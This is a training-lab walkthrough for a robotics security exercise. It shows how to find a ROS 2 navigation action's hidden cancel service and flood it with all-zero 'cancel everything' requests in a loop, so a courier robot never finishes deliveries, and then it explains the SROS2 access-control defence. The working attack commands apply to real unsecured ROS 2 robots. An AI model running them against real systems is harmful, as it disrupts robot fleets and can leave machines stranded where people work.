# NECROS · Scenario 6 · "Saboteur" · Attack Walkthrough

## What you will learn

This attack disrupts a robot's work without hijacking it, lying to it, or switching it
off. The robot stays healthy and online; it just never gets to finish a job.

Besides topics (message streams) and services (request-and-reply commands), ROS 2 has a
third kind of interface called **actions**. An action is used for a task that takes time
and can be followed, paused, or cancelled, for example "navigate to this location".
Real robots run navigation this way. Crucially, an action can be cancelled by anyone who
can reach it, and there is a built-in "cancel everything" request. If you keep sending
that cancel, the robot keeps abandoning its task.

**Your mission (shown on the console):** sabotage a courier's deliveries by aborting its
missions, without hijacking or disabling it.

---

## Before you start

Bring up the lab and open the console:

```bash
docker compose up -d
```

Open **http://localhost:3000**, click into **Scenario 6 (Saboteur)**. A courier robot
drives around a depot delivering to stations, one after another.

Open a terminal on the attacker machine and set the DDS domain to 6 (the domain number
always matches the scenario number):

```bash
docker compose exec attacker bash
export ROS_DOMAIN_ID=6
```

> DDS (Data Distribution Service) is the messaging layer the robots use, and it only
> connects programs on the same domain number. If a command shows nothing, confirm
> `echo $ROS_DOMAIN_ID` prints `6`.

---

## Phase 1 · Reconnaissance: find the action and how to cancel it

List the actions on the network and their types:

```bash
ros2 action list -t
```

You will see the courier's delivery action:

```
/saboteur/navigate_to_pose [nav2_msgs/action/NavigateToPose]
```

`NavigateToPose` is the standard navigation action real robots use. Behind the scenes,
an action is built from a few hidden helper services, and one of them is the cancel
command. Find it:

```bash
ros2 service list --include-hidden-services | grep cancel
```

You will see:

```
/saboteur/navigate_to_pose/_action/cancel_goal
```

Now look at what a cancel request contains:

```bash
ros2 interface show action_msgs/srv/CancelGoal
```

The description notes a special rule: if the goal identifier and the timestamp are both
zero, the request cancels every active goal. That is the wildcard you will use. You do
not need to know anything about the current delivery; the all-zero request cancels
whatever is running.

> On the console, the DDS Bus panel lists the cancel command among the privileged
> interfaces. That is your hint for where to aim.

---

## Phase 2 · The attack: cancel the courier's deliveries

Send a cancel request with an all-zero goal identifier and timestamp, which cancels the
delivery in progress:

```bash
ros2 service call /saboteur/navigate_to_pose/_action/cancel_goal \
  action_msgs/srv/CancelGoal \
  "{goal_info: {goal_id: {uuid: [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}, stamp: {sec: 0, nanosec: 0}}}"
```

The reply shows `return_code=0` and a non-empty `goals_canceling` list, which means the
active delivery was cancelled.

One cancel stops one delivery, but the courier just starts the next one. To sabotage it
continuously, run the cancel in a loop so each new delivery is aborted too:

```bash
while true; do
  ros2 service call /saboteur/navigate_to_pose/_action/cancel_goal \
    action_msgs/srv/CancelGoal \
    "{goal_info: {goal_id: {uuid: [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}, stamp: {sec: 0, nanosec: 0}}}" \
    >/dev/null 2>&1
  sleep 1
done
```

**What you will see on the console:** each cancel flips the courier to canceled (shown
red, with its route to the target cut by an X), the status shows it under attack, the
"sabotaged" counter climbs, and the DDS Bus panel flags the cancel command as abused by
an intruder. The courier stays healthy and keeps trying, but it is interrupted over and
over and its delivery rate drops sharply.

Press `Ctrl-C` to stop the loop. The courier goes back to completing deliveries normally.

> **What this attack does and does not achieve.** This is a disruption, not a clean kill.
> A cancel only stops the delivery that is currently running, and a delivery that is
> already almost finished may complete before your next cancel lands. So the honest
> effect is that you can abort deliveries at will and sharply reduce how much the robot
> gets done, not that you stop it completely. In the real world that still matters: a
> delivery fleet that cannot reliably finish its jobs, missed deadlines, or a robot left
> stopped in a walkway.

---

## Why the attack works

1. The cancel command accepts a request from anyone; there is no check of who is
   cancelling.
2. The "cancel everything" request is a normal, documented convenience for operators,
   but it is just as usable by an attacker.
3. You do not need any details about the current delivery. The all-zero request cancels
   whatever is running.

The robot is doing exactly what it is told. The flaw is that anyone is allowed to tell it
to stop working.

---

## How it is defended (the Defend phase)

Turning on SROS2 (Secure ROS 2) with access control means only an authorized commander
may send a cancel. An uninvited attacker cannot join the secured network, and a program
that is on the network but not authorized has its cancel refused. See the Scenario 6
Defend walkthrough.

---

## Quick checklist

- [ ] `ros2 action list -t` shows `/saboteur/navigate_to_pose`.
- [ ] `ros2 service list --include-hidden-services | grep cancel` reveals the cancel
      command.
- [ ] A single cancel request returns `return_code=0` and aborts the current delivery
      (the console shows canceled).
- [ ] Looping the cancel keeps the sabotaged counter climbing while deliveries stall.
- [ ] Stopping the loop lets the courier resume completing deliveries.
